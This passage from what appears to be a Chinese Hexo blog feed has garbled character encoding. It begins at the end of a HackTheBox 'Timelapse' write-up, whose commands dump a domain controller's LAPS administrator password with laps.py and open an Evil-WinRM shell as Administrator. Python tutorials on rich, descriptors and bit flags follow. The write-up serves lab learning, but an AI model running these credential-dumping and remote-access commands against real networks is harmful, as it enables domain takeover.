class=" language-bash codeBlockLines"><span class="line">[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\svc_deploy\Documents&gt; net user /domain</span><span class="line"></br></span><span class="line">User accounts <span class="hljs-keyword">for</span> \\</span><span class="line"></br></span><span class="line">-------------------------------------------------------------------------------</span><span class="line">Administrator            babywyrm                 Guest</span><span class="line">krbtgt                   legacyy                  payl0ad</span><span class="line">sinfulz                  svc_deploy               thecybergeek</span><span class="line">TRX</span><span class="line">The <span class="hljs-built_in">command</span> completed with one or more errors.</span></code></pre></div></div><p>æŸ¥çœ‹ç®¡ç†å‘˜è´¦å·</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\svc_deploy\Documents&gt; net group <span class="hljs-string">&quot;Domain Admins&quot;</span> /domain</span><span class="line">Group name     Domain Admins</span><span class="line">Comment        Designated administrators of the domain</span><span class="line"></br></span><span class="line">Members</span><span class="line"></br></span><span class="line">-------------------------------------------------------------------------------</span><span class="line">Administrator            payl0ad                  thecybergeek</span><span class="line">TRX</span><span class="line">The <span class="hljs-built_in">command</span> completed successfully.</span></code></pre></div></div><p>åˆ¤æ–­æ˜¯å¦æœ‰åº”ç”¨äº†LAPS(Local Administrator Password Solution)</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\svc_deploy\Documents&gt; reg query <span class="hljs-string">&quot;HKLM\Software\Policies\Microsoft Services\AdmPwd&quot;</span> /v AdmPwdEnabled</span><span class="line"></br></span><span class="line">HKEY_LOCAL_MACHINE\Software\Policies\Microsoft Services\AdmPwd</span><span class="line">    AdmPwdEnabled    REG_DWORD    0x1</span></code></pre></div></div><p><code>cmder -p db/windows/0_privilege_escalation/2_logging_enumeration.xd</code></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">root@145a5d706052 /t/b/workspace<span class="hljs-comment"># cmder use -r 4</span></span><span class="line">[âœ“] Executing: laps.py -u svc_deploy -p <span class="hljs-string">&#x27;E3R$Q62^12p7PLlC%KWaxuaV&#x27;</span> -d timelapse.htb</span><span class="line">DC01$:LK/yg<span class="hljs-comment">#uFR)x)Q3z!a[.080Tb</span></span></code></pre></div></div><p>è·å¾—äº†DC01åŸŸæ§çš„ç®¡ç†å‘˜å¯†ç : <code>LK/yg#uFR)x)Q3z!a[.080Tb</code><br>DC01çš„ç®¡ç†å‘˜å°±æ˜¯<code>Administrator</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªå¯†ç è¿›è¡Œç™»å½•äº†</p><p><code>cmder -p db/pentesting/1_enumeration/5985_5986_WinRM.xd</code></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">root@145a5d706052 /t/b/workspace<span class="hljs-comment"># cmder use -r 4</span></span><span class="line">[âœ“] Executing: evil-winrm -u Administrator -p <span class="hljs-string">&#x27;LK/yg#uFR)x)Q3z!a[.080Tb&#x27;</span> -i 10.10.11.152 -S</span><span class="line"></br></span><span class="line">Evil-WinRM shell v2.3</span><span class="line"></br></span><span class="line">Warning: SSL enabled</span><span class="line"></br></span><span class="line">Info: Establishing connection to remote endpoint</span><span class="line"></br></span><span class="line">[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Documents&gt;</span></code></pre></div></div><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™é¢˜è€ƒå¯Ÿäº†å¦‚ä½•zipå’Œpfxæ–‡ä»¶çš„ç ´è§£ï¼Œpfxè¯ä¹¦çš„å…¬é’¥ç§é’¥çš„è½¬åŒ–ã€‚<br>ææƒéƒ¨åˆ†è€ƒå¯Ÿäº†lapsçš„å¯†ç dumpæ–¹å¼ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
          <category> HTB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python rich åº“ä½¿ç”¨æ–¹æ³•</title>
      <link href="/2022/03/22/python-rich-%E5%BA%93%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
      <url>/2022/03/22/python-rich-%E5%BA%93%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="æ¨¡å—"><a href="#æ¨¡å—" class="headerlink" title="æ¨¡å—"></a>æ¨¡å—</h2><p>ä½¿ç”¨<code>python3 -m rich.&lt;module&gt;</code>è¿™æ ·çš„å½¢å¼å¯ä»¥çœ‹åˆ°å®˜æ–¹ç»™å‡ºçš„ä¸€äº›ä¾‹å­ï¼Œå¯ä»¥æ¼”ç¤ºçš„æ¨¡å—æœ‰ï¼š</p><table><thead><tr><th align="center">æ¨¡å—</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center"><code>align</code></td><td align="center">å®šä½</td></tr><tr><td align="center"><code>box</code></td><td align="center">box æ•ˆæœ</td></tr><tr><td align="center"><code>color</code></td><td align="center">è‰²å½©å®šä¹‰</td></tr><tr><td align="center"><code>columns</code></td><td align="center">å®šä¹‰åˆ—</td></tr><tr><td align="center"><code>console</code></td><td align="center">é«˜å±‚çº§æ¥å£</td></tr><tr><td align="center"><code>default_styles</code></td><td align="center">é»˜è®¤æ ·å¼</td></tr><tr><td align="center"><code>diagnose</code></td><td align="center">è¯Šæ–­</td></tr><tr><td align="center"><code>emoji</code></td><td align="center">è¾“å‡ºæ‰€æœ‰è¡¨æƒ…ï¼Œä½¿ç”¨æ–¹å¼å¯ä»¥ç›´æ¥æŠŠè¡¨æƒ…ç²˜è´´è¿‡æ¥ï¼Œæˆ–è€…<code>:&lt;emoji_name&gt;:</code>è¿™ç§æ–¹å¼</td></tr><tr><td align="center"><code>highlighter</code></td><td align="center">é«˜äº®</td></tr><tr><td align="center"><code>json</code></td><td align="center">Json æ ¼å¼è¾“å‡º</td></tr><tr><td align="center"><code>layout</code></td><td align="center">å¸ƒå±€æ•ˆæœ</td></tr><tr><td align="center"><code>live</code></td><td align="center">æ¸²æŸ“é•¿æœŸå­˜æ´»ï¼Œè‡ªåŠ¨æ›´æ–°çš„äº‹ä»¶</td></tr><tr><td align="center"><code>logging</code></td><td align="center">æ—¥å¿—è¾“å‡º</td></tr><tr><td align="center"><code>markdown</code></td><td align="center">Markdown æ ¼å¼è¾“å‡º</td></tr><tr><td align="center"><code>markup</code></td><td align="center">æ¼”ç¤ºå‡ ç§æ‰“æ ‡ç­¾çš„æ–¹å¼</td></tr><tr><td align="center"><code>padding</code></td><td align="center">æ¼”ç¤ºpaddingçš„ç”¨æ³•</td></tr><tr><td align="center"><code>pager</code></td><td align="center">æ¼”ç¤ºé¡µé¢çš„ç”¨æ³•</td></tr><tr><td align="center"><code>palette</code></td><td align="center">è¾“å‡ºä¸€ä¸ªè°ƒè‰²æ¿ï¼Œå…¶å®è¿™é‡Œçš„ç¤ºä¾‹å‘Šè¯‰äº†ä½ å¦‚ä½•è‡ªå®šä¹‰ä¸€ä¸ªå¯ä»¥è¢«æ¸²æŸ“çš„ç±»ã€‚</td></tr><tr><td align="center"><code>panel</code></td><td align="center">å¦‚ä½•å®šä¹‰ä¸€ä¸ªé¢æ¿å•å…ƒ</td></tr><tr><td align="center"><code>pretty</code></td><td align="center">æ¼‚äº®çš„å˜é‡è¾“å‡º</td></tr><tr><td align="center"><code>progress_bar</code></td><td align="center">è¿›åº¦æ¡</td></tr><tr><td align="center"><code>progress</code></td><td align="center">ä½¿ç”¨è¿›åº¦æ¡çš„ä¾‹å­</td></tr><tr><td align="center"><code>prompt</code></td><td align="center">è¾“å…¥æç¤ºç¬¦</td></tr><tr><td align="center"><code>repr</code></td><td align="center">æè¿°ä¿¡æ¯</td></tr><tr><td align="center"><code>rule</code></td><td align="center">åˆ†å‰²çº¿</td></tr><tr><td align="center"><code>scope</code></td><td align="center">æ˜¾ç¤ºä½œç”¨åŸŸå†…çš„å˜é‡</td></tr><tr><td align="center"><code>segment</code></td><td align="center">segmentæ˜¯Richæ¸²æŸ“çš„åŸºæœ¬å•å…ƒ</td></tr><tr><td align="center"><code>spinner</code></td><td align="center">åŠ è½½æ˜¾ç¤ºåŠ¨ç”»æ•ˆæœ</td></tr><tr><td align="center"><code>status</code></td><td align="center">çŠ¶æ€æ›´æ–°æ•ˆæœ</td></tr><tr><td align="center"><code>syntax</code></td><td align="center">æ˜¾ç¤º code åŒºåŸŸ</td></tr><tr><td align="center"><code>table</code></td><td align="center">è¡¨æ ¼</td></tr><tr><td align="center"><code>text</code></td><td align="center">æœ¬æ–‡æ•ˆæœ</td></tr><tr><td align="center"><code>theme</code></td><td align="center">é»˜è®¤é£æ ¼</td></tr><tr><td align="center"><code>traceback</code></td><td align="center">å›æº¯</td></tr><tr><td align="center"><code>tree</code></td><td align="center">æ ‘ç»“æ„</td></tr></tbody></table><h2 id="è‡ªå®šä¹‰é«˜äº®"><a href="#è‡ªå®šä¹‰é«˜äº®" class="headerlink" title="è‡ªå®šä¹‰é«˜äº®"></a>è‡ªå®šä¹‰é«˜äº®</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> rich.theme <span class="hljs-keyword">import</span> Theme</span><span class="line"><span class="hljs-keyword">from</span> rich.highlighter <span class="hljs-keyword">import</span> RegexHighlighter</span><span class="line"><span class="hljs-keyword">from</span> rich.text <span class="hljs-keyword">import</span> Text</span><span class="line"></br></span><span class="line">console = Console(</span><span class="line">    theme=Theme(</span><span class="line">        &#123;</span><span class="line">            <span class="hljs-string">&quot;variable&quot;</span>: <span class="hljs-string">&quot;dim&quot;</span>,</span><span class="line">        &#125;</span><span class="line">    )</span><span class="line">)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommandHighlighter</span>(<span class="hljs-params">RegexHighlighter</span>):</span></span><span class="line">    highlights = [</span><span class="line">        <span class="hljs-string">r&quot;(?P&lt;variable&gt;#&#123;.*?&#125;)&quot;</span></span><span class="line">    ]</span><span class="line"></br></span><span class="line">cmd_highlighter = CommandHighlighter()</span><span class="line"></br></span><span class="line">line = <span class="hljs-string">&quot;hello this is #&#123;variable&#125; test&quot;</span></span><span class="line">console.<span class="hljs-built_in">print</span>(cmd_highlighter(Text.from_markup(line)))</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> todo </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python æè¿°ç¬¦è¯¦è§£</title>
      <link href="/2022/03/10/python-%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%AF%A6%E8%A7%A3/"/>
      <url>/2022/03/10/python-%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://zhuanlan.zhihu.com/p/52708890">å¾ˆå¥½çš„è§£æ</a></li><li><a href="https://docs.python.org/zh-cn/3/howto/descriptor.html">å®˜æ–¹æ–‡æ¡£</a></li></ul><h2 id="æè¿°ç¬¦çš„ä»‹ç»"><a href="#æè¿°ç¬¦çš„ä»‹ç»" class="headerlink" title="æè¿°ç¬¦çš„ä»‹ç»"></a>æè¿°ç¬¦çš„ä»‹ç»</h2><p>åªè¦ç±»ä¸­åŒ…å«äº†<code>__get__</code>, <code>__set__</code>, <code>__delete__</code> ä¸­çš„ä»»æ„ä¸€ä¸ªï¼Œé‚£ä¹ˆè¿™ä¸ªç±»å°±æ˜¯æè¿°ç±»</p><p>ä¹Ÿå°±æ˜¯å¯¹è¿™ä¸ªå®ä¾‹çš„å–ã€è®¾ç½®å’Œåˆ é™¤éƒ½ä¼šæ‰§è¡Œä¸Šé¢å¯¹åº”çš„æ–¹æ³•ã€‚</p><p>å¿…é¡»ä½œä¸ºç±»å˜é‡è¿›è¡Œåˆå§‹åŒ–ã€‚</p><p>åŒæ—¶åŒ…å«<code>__get__</code>å’Œ<code>__set__</code>çš„è¢«ç§°ä¸ºæ•°æ®æè¿°ç¬¦ï¼Œè€Œåªæœ‰<code>__get__</code>è¢«ç§°ä¸ºéæ•°æ®æè¿°ç¬¦</p><p>å¯¹äºä¸€ä¸ªç±»ä¸­çš„å˜é‡è°ƒç”¨é¡ºåºå‚è€ƒä¸‹å›¾ï¼š</p><p><img src="/2022/03/10/python-%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%AF%A6%E8%A7%A3/1.jpg"></p><p>ä»ä¸Šå›¾å¯ä»¥çœ‹åˆ°è°ƒç”¨é¡ºåºä¸ºï¼š<br><code>__getattribute__</code> &gt; æ•°æ®æè¿°ç¬¦<code>__get__</code> &gt; éæ•°æ®æè¿°ç¬¦<code>__get__</code> &gt; å…œåº•çš„<code>__getattr__</code></p><p>Example:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Price</span>:</span></span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        self._price = <span class="hljs-number">0</span></span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__get__</span>(<span class="hljs-params">self, obj, klass</span>):</span></span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;call __get__ method, get: &#x27;</span>, self._price)</span><span class="line">        <span class="hljs-keyword">return</span> self._price</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__set__</span>(<span class="hljs-params">self, obj, value</span>):</span></span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;call __set__ method, set: &#x27;</span>, value)</span><span class="line">        <span class="hljs-keyword">if</span> value &lt; <span class="hljs-number">0</span>:</span><span class="line">            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&#x27;price should not be negative&#x27;</span>)</span><span class="line">        self._price = value</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__delete__</span>(<span class="hljs-params">self, obj</span>):</span></span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;call __delete__ method , price to 0&#x27;</span>)</span><span class="line">        self._price = <span class="hljs-number">0</span></span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Apple</span>:</span></span><span class="line"></br></span><span class="line">    price = Price()</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, price</span>):</span></span><span class="line">        self.price = price</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__getattribute__</span>(<span class="hljs-params">self, __name: <span class="hljs-built_in">str</span></span>):</span></span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call __getattribute__ method, get: &quot;</span>, __name)</span><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>().__getattribute__(__name)</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__getattr__</span>(<span class="hljs-params">self, __name: <span class="hljs-built_in">str</span></span>):</span></span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call __getattr__ method, get: &quot;</span>, __name)</span><span class="line"></br></span><span class="line"></br></span><span class="line">a1 = Apple(<span class="hljs-number">10</span>)</span><span class="line">a1.no_exist_attr</span><span class="line"><span class="hljs-built_in">print</span>(a1.price)</span><span class="line">a1.price = <span class="hljs-number">15</span></span><span class="line"><span class="hljs-built_in">print</span>(a1.price)</span><span class="line"><span class="hljs-keyword">del</span> a1.price</span><span class="line"><span class="hljs-built_in">print</span>(a1.price)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># output:</span></span><span class="line"><span class="hljs-comment">#call __set__ method, set:  10</span></span><span class="line"><span class="hljs-comment">#call __getattribute__ method, get:  no_exist_attr</span></span><span class="line"><span class="hljs-comment">#call __getattr__ method, get:  no_exist_attr</span></span><span class="line"><span class="hljs-comment">#call __getattribute__ method, get:  price</span></span><span class="line"><span class="hljs-comment">#call __get__ method, get:  10</span></span><span class="line"><span class="hljs-comment">#10</span></span><span class="line"><span class="hljs-comment">#call __set__ method, set:  15</span></span><span class="line"><span class="hljs-comment">#call __getattribute__ method, get:  price</span></span><span class="line"><span class="hljs-comment">#call __get__ method, get:  15</span></span><span class="line"><span class="hljs-comment">#15</span></span><span class="line"><span class="hljs-comment">#call __delete__ method , price to 0</span></span><span class="line"><span class="hljs-comment">#call __getattribute__ method, get:  price</span></span><span class="line"><span class="hljs-comment">#call __get__ method, get:  0</span></span><span class="line"><span class="hljs-comment">#0</span></span></code></pre></div></div><h2 id="ç»“åˆè£…é¥°å™¨"><a href="#ç»“åˆè£…é¥°å™¨" class="headerlink" title="ç»“åˆè£…é¥°å™¨"></a>ç»“åˆè£…é¥°å™¨</h2><p>æˆ‘ä»¬ä»¥<code>@property</code>çš„pythonç®€å•å®ç°ä¸ºä¾‹ã€‚</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mproperty</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span></span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, fget, fset=<span class="hljs-literal">None</span>, fdel=<span class="hljs-literal">None</span></span>):</span></span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call mproperty.__init__ method, set getter func&quot;</span>)</span><span class="line">        self._fget = fget</span><span class="line">        self._fset = fset</span><span class="line">        self._fdel = fdel</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__get__</span>(<span class="hljs-params">self, obj, klass</span>):</span></span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;call __get__ method&#x27;</span>)</span><span class="line">        <span class="hljs-keyword">return</span> self._fget(obj)</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__set__</span>(<span class="hljs-params">self, obj, val</span>):</span></span><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">hasattr</span>(self._fset, <span class="hljs-string">&#x27;__call__&#x27;</span>):</span><span class="line">            <span class="hljs-keyword">raise</span> AttributeError(<span class="hljs-string">&quot;Readonly attribute!&quot;</span>)</span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;call __set__ method, set: &#x27;</span>, val)</span><span class="line">        self._fset(obj, val)</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__delete__</span>(<span class="hljs-params">self, obj</span>):</span></span><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">hasattr</span>(self._fdel, <span class="hljs-string">&#x27;__call__&#x27;</span>):</span><span class="line">            <span class="hljs-keyword">raise</span> AttributeError(<span class="hljs-string">&quot;Can&#x27;t delete the attribute!&quot;</span>)</span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;call __delete__ method, price to 0&#x27;</span>)</span><span class="line">        self._fdel(obj)</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">setter</span>(<span class="hljs-params">self, fset</span>):</span></span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call mproperty.setter method, set setter func&quot;</span>)</span><span class="line">        self._fset = fset</span><span class="line">        <span class="hljs-keyword">return</span> self</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">deleter</span>(<span class="hljs-params">self, fdel</span>):</span></span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call mproperty.delete method, set delete func&quot;</span>)</span><span class="line">        self._fdel = fdel</span><span class="line">        <span class="hljs-keyword">return</span> self</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Apple</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span></span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, price=<span class="hljs-number">0</span></span>):</span></span><span class="line">        self._price = price</span><span class="line"></br></span><span class="line"><span class="hljs-meta">    @mproperty</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">price</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        <span class="hljs-keyword">return</span> self._price</span><span class="line"></br></span><span class="line"><span class="hljs-meta">    @price.setter</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">price</span>(<span class="hljs-params">self, value</span>):</span></span><span class="line">        <span class="hljs-keyword">if</span> value &lt; <span class="hljs-number">0</span>:</span><span class="line">            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;Price must be greater than 0&quot;</span>)</span><span class="line">        self._price = value</span><span class="line"></br></span><span class="line"><span class="hljs-meta">    @price.deleter</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">price</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;delete price&quot;</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=== start process ===&quot;</span>)</span><span class="line"></br></span><span class="line">a1 = Apple(<span class="hljs-number">10</span>)</span><span class="line">a1.price</span><span class="line">a1.price = <span class="hljs-number">15</span></span><span class="line">a1.price</span><span class="line"><span class="hljs-keyword">del</span> a1.price</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># output:</span></span><span class="line"><span class="hljs-comment">#call mproperty.__init__ method, set getter func</span></span><span class="line"><span class="hljs-comment">#call mproperty.setter method, set setter func</span></span><span class="line"><span class="hljs-comment">#call mproperty.delete method, set delete func</span></span><span class="line"><span class="hljs-comment">#=== start process ===</span></span><span class="line"><span class="hljs-comment">#call __get__ method</span></span><span class="line"><span class="hljs-comment">#call __set__ method, set:  15</span></span><span class="line"><span class="hljs-comment">#call __get__ method</span></span><span class="line"><span class="hljs-comment">#call __delete__ method, price to 0</span></span><span class="line"><span class="hljs-comment">#delete price</span></span></code></pre></div></div><blockquote><p>å¦‚æœè¿˜ä¸æ¸…æ¥šè£…é¥°å™¨çš„åŸç†ï¼Œå¯ä»¥çœ‹<a href="/2021/08/25/python-%E8%A3%85%E9%A5%B0%E5%99%A8%E8%AF%A6%E8%A7%A3/" title="æˆ‘å†™çš„è¿™ç¯‡">æˆ‘å†™çš„è¿™ç¯‡</a></p></blockquote><p>æˆ‘ä»¬æ¥ä¸€æ­¥ä¸€æ­¥åˆ†æ:</p><ol><li><p>åœ¨ç¨‹åºåˆå§‹åŒ–é˜¶æ®µï¼Œå°†æ‰§è¡Œ<code>@mproperty</code>ï¼Œæ­¤æ—¶è£…é¥°çš„æ˜¯<code>price</code>ï¼Œç­‰ä»·äº<code>mpropertry(price)</code>, æ­¤æ—¶<code>price</code>å‡½æ•°å®é™…ä¸Šå°±æ˜¯<code>mproperty</code>å®ä¾‹äº†</p></li><li><p><code>@price.setter</code>è£…é¥°<code>price</code>, é‡Œé¢çš„<code>@price</code>ç°åœ¨å°±æ˜¯<code>mproperty</code>å®ä¾‹ï¼Œæ‰€ä»¥æœ‰<code>setter</code>æ–¹æ³•ã€‚åœ¨<code>setter</code>ä¸­è®¾ç½®äº†<code>self._fset</code>åè¿”å›<code>self</code>ï¼Œè¿™æ ·<code>price</code>åŒæ ·æŒ‡å‘çš„æ˜¯<code>mproperty</code>å®ä¾‹ã€‚</p></li><li><p><code>@price.delete</code>è£…é¥°<code>price</code>, åŒç†<code>price</code>æŒ‡å‘äº†åŒä¸€ä¸ª<code>mproperty</code>å®ä¾‹ï¼Œä¿è¯äº†è¿™å‡ ä¸ªæ–¹æ³•éƒ½å…¶å®æ˜¯ä¸ªå®ä¾‹ã€‚</p></li><li><p>æ—¢ç„¶éƒ½æ˜¯ä¸€ä¸ªå®ä¾‹ï¼Œå¹¶ä¸”<code>mproperty</code>å«æœ‰<code>__get__</code> <code>__set__</code> <code>__delete</code>ï¼Œæ˜¯æè¿°å™¨ï¼Œæ‰€ä»¥åœ¨è°ƒç”¨<code>price</code>çš„æ—¶å€™ï¼Œå°±ä¼šå»è°ƒç”¨å¯¹åº”çš„æ–¹æ³•ã€‚</p></li><li><p>é€šè¿‡<code>self._get(obj)</code>è¿™æ ·çš„å½¢å¼å†å›è¿‡æ¥è°ƒç”¨<code>Apple.price</code>ä¸­çš„æ–¹æ³•</p></li></ol><p>å…¶å®è¿™é‡Œé¢çš„å…³é”®ç‚¹å°±æ˜¯<code>setter</code>å’Œ<code>delete</code>ä¸­çš„<code>return self</code>åˆ°åº•è¿”å›çš„æ˜¯ä»€ä¹ˆï¼Œæˆä¸ºäº†ä»€ä¹ˆå½¢å¼è¢«è°ƒç”¨ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python æœ‰è¶£çš„ä»£ç ç‰‡æ®µæ”¶é›†</title>
      <link href="/2022/03/10/python-%E6%9C%89%E8%B6%A3%E7%9A%84%E4%BB%A3%E7%A0%81%E7%89%87%E6%AE%B5%E6%94%B6%E9%9B%86/"/>
      <url>/2022/03/10/python-%E6%9C%89%E8%B6%A3%E7%9A%84%E4%BB%A3%E7%A0%81%E7%89%87%E6%AE%B5%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡ä¸ºé˜…è¯»æºç æ—¶çœ‹åˆ°çš„ä¸€äº›æœ‰è¶£çš„ä»£ç ï¼Œæœ‰æ‰€æ”¹å˜åè®°å½•</p><h2 id="ä½¿ç”¨äºŒè¿›åˆ¶ä½œä¸ºé€‰é¡¹åˆ¤æ–­"><a href="#ä½¿ç”¨äºŒè¿›åˆ¶ä½œä¸ºé€‰é¡¹åˆ¤æ–­" class="headerlink" title="ä½¿ç”¨äºŒè¿›åˆ¶ä½œä¸ºé€‰é¡¹åˆ¤æ–­"></a>ä½¿ç”¨äºŒè¿›åˆ¶ä½œä¸ºé€‰é¡¹åˆ¤æ–­</h2><p>è¿™æ˜¯åœ¨<code>Rich</code>ä¸­çœ‹åˆ°çš„ä¸€æ®µ, ç”¨<code>sum</code>æ€»å’Œï¼Œå¾—åˆ°é‚£äº›å‚æ•°ä¸ºçœŸ</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">self._set_attributes = <span class="hljs-built_in">sum</span>(</span><span class="line">    (</span><span class="line">        bold <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>,</span><span class="line">        dim <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-number">2</span>,</span><span class="line">        italic <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-number">4</span>,</span><span class="line">        underline <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-number">8</span>,</span><span class="line">        blink <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-number">16</span>,</span><span class="line">        blink2 <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-number">32</span>,</span><span class="line">        reverse <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-number">64</span>,</span><span class="line">        conceal <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-number">128</span>,</span><span class="line">        strike <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-number">256</span>,</span><span class="line">        underline2 <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-number">512</span>,</span><span class="line">        frame <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span 